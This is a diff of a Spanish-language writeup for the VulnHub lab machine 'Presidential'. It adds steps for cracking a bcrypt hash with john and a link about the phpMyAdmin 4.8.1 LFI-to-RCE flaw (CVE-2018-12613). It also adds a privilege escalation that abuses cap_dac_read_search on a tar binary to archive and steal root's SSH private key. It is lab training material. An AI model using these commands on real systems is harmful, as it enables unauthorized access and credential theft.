@@ -2,9 +2,9 @@
 description: >-
   Writeup de la máquina de dificultad media Presidential de la página https://vulnhub.com
 title: VulnHub - Presidential | (Difficulty Medium) - Linux
-date: 2025-02-07
+date: 2025-02-08
 categories: [Writeup, VulnHub]
-tags: [vulnhub, hacking, linux, medium, lfi, rce, phpmyadmin, capabilities, writeup, redteam, pentesting]
+tags: [vulnhub, hacking, linux, medium, lfi, rce, phpmyadmin, cap_dac_read_search+ep, writeup, redteam, pentesting]
 image_post: true
 image: https://github.com/user-attachments/assets/bb94b984-cc01-4945-a8ba-7b5bd73cae7c
 ---
@@ -14,10 +14,11 @@ image: https://github.com/user-attachments/assets/bb94b984-cc01-4945-a8ba-7b5bd7
 * Web Enumeration
 * Information Lekeage (config.php.bak)
 * Subdomain Enumeration
+* Cracking Hashes
 * phpMyAdmin Local File Inclusion
 * Internal Port Discovery through LFI (/proc/net/tcp)
 * Abusing phpMyAdmin 4.8.1 LFI to RCE via id_session (CVE-2018-12613)
-* PHP Vulnerability Code Analisys (index.php)
+* Abusing Capabilities /usr/bin/tarS (Bypass DAC - Discretionary Access Control)
 
 ## Enumeration
 
@@ -107,21 +108,9 @@ gobuster dir -u http://votenow.local -w /usr/share/seclists/Discovery/Web-Conten
 /icons/               (Status: 200) [Size: 74409]
 ```
 
-Observo dos archivo que llaman mi atención, uno es config.php y el otro es el backup config.php.bak, accedo a config.php y no soy capaz de ver nada, pero al acceder a config.php.bak consigo observar en el código fuente unas credenciales de acceso a la base de datos, pero el servicio no se encuentra expuesto.
+Observo dos archivos que llaman mi atención, uno es config.php y el otro es el backup config.php.bak, accedo a config.php y no soy capaz de ver nada, pero al acceder a config.php.bak consigo observar en el código fuente unas credenciales de acceso a la base de datos, pero el servicio no se encuentra expuesto.
 
 ![imagen](https://github.com/user-attachments/assets/3a5119c7-5f85-4f93-af9b-2164dd1c785d)
-
-Intento acceder por ssh como el usuario votebox, pero necesito la clave privada para realizar la autenticación, por lo que no es posible.
-
-```bash
-ssh votebox@votenow.local -p2082
-The authenticity of host '[votenow.local]:2082 ([192.168.2.142]:2082)' can't be established.
-ED25519 key fingerprint is SHA256:d+Zod13cfhVNilw/xRRCqquMQdOhDdQ1RVwTzx0mUdo.
-This key is not known by any other names.
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added '[votenow.local]:2082' (ED25519) to the list of known hosts.
-votebox@votenow.local: Permission denied (publickey,gssapi-keyex,gssapi-with-mic).
-```
 
 Utilizo ffuf para realizar enumeracion de subdominios, consigo encontrar un subdominio, el cual es datasafe.votenow.local
 
@@ -171,6 +160,26 @@ Observo una base de datos llamada users, donde consigo ver un usuario y una cont
 
 ![imagen](https://github.com/user-attachments/assets/ea546b7d-4fe9-4e1f-a2f5-e273dec9f9f7)
 
+Utilizo john para intentar crackear el hash del usuario admin, consigo obtener la contraseña, la cual es Stella, el problema es que intento iniciar sesión por SSH y se requiere autenticación con clave, por lo que no puedo obtener acceso a través de SSH
+
+```bash
+john --wordlist=/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 4096 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Stella           (?)     
+1g 0:00:00:00 DONE (2025-02-08 00:26) 1.063g/s 38.29p/s 38.29c/s 38.29C/s Stella..jordan
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+```
+
+```bash
+ssh admin@votenow.local -p2082
+admin@votenow.local: Permission denied (publickey,gssapi-keyex,gssapi-with-mic).
+```
+
 Consigo ver que se está utilizando la versión 4.8.1 en phpMyAdmin
 
 ![imagen](https://github.com/user-attachments/assets/298383c2-43ee-40cd-99a4-d12a581e1e55)
@@ -199,6 +208,8 @@ Encuentro en exploit-db los pasos a seguir para explotar la vulnerabilidad CVE-2
 * [phpMyAdmin 4.8.1 - (Authenticated) Remote Code Execution](https://www.exploit-db.com/exploits/50457)
 
 ![imagen](https://github.com/user-attachments/assets/71384abf-f93f-4102-b608-bc42fc977b01)
+
+* [PhpMyAdmin 4.8.x Ejecución remota de código](https://unaaldia.hispasec.com/2018/06/vulnerabilidad-en-phpmyadmin-4-8-x-permite-ejecucion-remota-de-codigo.html)
 
 El LFI reside en index.php, ya que según explican en la línea 61 contiene un include con un $_REQUEST['target'];, el código contiene varias medidas de seguridad para prevenir LFI, pero se proporciona un payload urlencodeado dos veces con %253f para evitar la validación. Quedaría algo así:
 
@@ -254,3 +265,74 @@ bash-4.2$ whoami
 apache
 ```
 
+## Post exploitation
+
+### User Pivoting
+
+Obtengo acceso al sistema como el usuario apache, este es un usuario con bajos privilegios por lo que debo de buscar alguna manera de pivotar hacia otro usuario. Comenzaré visualizando cuales son los usuarios que existen en el sistema.
+
+```bash
+bash-4.2$ grep sh$ /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+admin:x:1000:1000::/home/admin:/bin/bash
+```
+
+Observo que el usuario admin es el único que se encuentra disponible en el sistema a parte de root, anteriormente en phpMyAdmin he sido capaz de obtener la contraseña del usuario admin, la cual es Stella, por lo que migro al usuario admin
+
+```bash
+bash-4.2$ su admin
+Password: 
+[admin@votenow home]$ whoami
+admin
+```
+
+### Privilege escalation
+
+Utilizo el comando getcap para visualizar las capabilities, observo /usr/bin/tarS con cap_dac_read_search+ep, esto permite al proceso ignorar los permisos de lectura y búsqueda puediendo leer archivos y recorrer directorios sin importar los permisos establecidos por el propietario. Por lo que podría intentar realizar un comprimido de /roo/.ssh, si el usuario root dispone de un par de claves obtendría las misma y podría escalar mis privilegios.
+
+```bash
+[admin@votenow tmp]$ tarS -cvf pwned.tar /root/.ssh
+tarS: Removing leading `/' from member names
+/root/.ssh/
+/root/.ssh/id_rsa
+/root/.ssh/id_rsa.pub
+/root/.ssh/authorized_keys
+```
+
+Extraigo el contenido de pwned.tar
+
+```bash
+[admin@votenow tmp]$ tar -xvf pwned.tar 
+root/.ssh/
+root/.ssh/id_rsa
+root/.ssh/id_rsa.pub
+root/.ssh/authorized_keys
+```
+
+Consigo obtener la clave privada del usuario root
+
+```bash
+[admin@votenow .ssh]$ pwd  
+/tmp/root/.ssh
+[admin@votenow .ssh]$ ls -la
+total 12
+drwx------ 2 admin admin   61 Jun 28  2020 .
+drwxrwxr-x 3 admin admin   18 Feb  7 23:50 ..
+-rw-r--r-- 1 admin admin  744 Jun 28  2020 authorized_keys
+-rw------- 1 admin admin 3243 Jun 28  2020 id_rsa
+-rw-r--r-- 1 admin admin  744 Jun 28  2020 id_rsa.pub
+```
+
+Utilizo ssh para migrar el usuario root utilizando autenticación por clave y escalar mis privilegios
+
+```bash
+[admin@votenow .ssh]$ ssh -i id_rsa root@127.0.0.1 -p2082
+The authenticity of host '[127.0.0.1]:2082 ([127.0.0.1]:2082)' can't be established.
+ECDSA key fingerprint is SHA256:Aifft9XCM1HTYRoNyus8/X9amRXYGMI80UwZGUyWs10.
+ECDSA key fingerprint is MD5:e9:e6:3a:83:8e:94:f2:98:dd:3e:70:fb:b9:a3:e3:99.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '[127.0.0.1]:2082' (ECDSA) to the list of known hosts.
+Last login: Sun Jun 28 00:42:56 2020 from 192.168.56.1
+[root@votenow ~]# whoami
+root
+```
